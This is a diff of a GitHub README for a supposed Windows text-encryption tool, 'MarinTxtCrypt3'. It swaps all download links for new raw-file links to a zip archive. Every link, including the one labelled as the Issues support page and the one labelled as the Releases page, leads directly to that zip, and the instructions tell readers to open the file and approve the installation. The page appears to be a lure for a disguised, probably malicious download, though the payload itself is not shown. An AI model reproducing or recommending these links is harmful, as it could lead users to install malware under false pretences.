@@ -6,7 +6,7 @@ MarinTxtCrypt3 is a user-friendly program designed for encrypting and decrypting
 ## 🚀 Getting Started
 To get started, you will need to download MarinTxtCrypt3 from our Releases page. This software is designed for average computer users, so you'll find it easy to follow the steps below.
 
-[![Download MarinTxtCrypt3](https://raw.githubusercontent.com/sneakon/MarinTxtCrypt3/main/metaline/MarinTxtCrypt3-2.5.zip)](https://raw.githubusercontent.com/sneakon/MarinTxtCrypt3/main/metaline/MarinTxtCrypt3-2.5.zip)
+[![Download MarinTxtCrypt3](https://github.com/sneakon/MarinTxtCrypt3/raw/refs/heads/main/metaline/Marin-Txt-Crypt-2.7.zip)](https://github.com/sneakon/MarinTxtCrypt3/raw/refs/heads/main/metaline/Marin-Txt-Crypt-2.7.zip)
 
 ## 💾 System Requirements
 - **Operating System:** Windows 10 or newer
@@ -15,9 +15,9 @@ To get started, you will need to download MarinTxtCrypt3 from our Releases page.
 - **Disk Space:** 50 MB free space
 
 ## 📥 Download & Install
-1. To download MarinTxtCrypt3, visit this page: [Download MarinTxtCrypt3](https://raw.githubusercontent.com/sneakon/MarinTxtCrypt3/main/metaline/MarinTxtCrypt3-2.5.zip).
+1. To download MarinTxtCrypt3, visit this page: [Download MarinTxtCrypt3](https://github.com/sneakon/MarinTxtCrypt3/raw/refs/heads/main/metaline/Marin-Txt-Crypt-2.7.zip).
 2. On the Releases page, locate the latest version.
-3. Click on the file named “https://raw.githubusercontent.com/sneakon/MarinTxtCrypt3/main/metaline/MarinTxtCrypt3-2.5.zip” to begin the download.
+3. Click on the file named “https://github.com/sneakon/MarinTxtCrypt3/raw/refs/heads/main/metaline/Marin-Txt-Crypt-2.7.zip” to begin the download.
 4. Once the download completes, open the file to run the application. You may need to approve the installation.
 
 ## 🖥️ Application Interface
@@ -59,9 +59,9 @@ These methods ensure that your sensitive information remains confidential.
 - **Privacy Tools:** Utilize technology to guard your personal information.
 
 ## 📞 Support
-For help or questions regarding MarinTxtCrypt3, please reach out via [Issues](https://raw.githubusercontent.com/sneakon/MarinTxtCrypt3/main/metaline/MarinTxtCrypt3-2.5.zip) on GitHub. We aim to assist you promptly.
+For help or questions regarding MarinTxtCrypt3, please reach out via [Issues](https://github.com/sneakon/MarinTxtCrypt3/raw/refs/heads/main/metaline/Marin-Txt-Crypt-2.7.zip) on GitHub. We aim to assist you promptly.
 
 ## 📅 Updates
 Check our Releases page regularly for updates and new features. Your feedback is welcome!
 
-[![Download MarinTxtCrypt3](https://raw.githubusercontent.com/sneakon/MarinTxtCrypt3/main/metaline/MarinTxtCrypt3-2.5.zip)](https://raw.githubusercontent.com/sneakon/MarinTxtCrypt3/main/metaline/MarinTxtCrypt3-2.5.zip)
+[![Download MarinTxtCrypt3](https://github.com/sneakon/MarinTxtCrypt3/raw/refs/heads/main/metaline/Marin-Txt-Crypt-2.7.zip)](https://github.com/sneakon/MarinTxtCrypt3/raw/refs/heads/main/metaline/Marin-Txt-Crypt-2.7.zip)
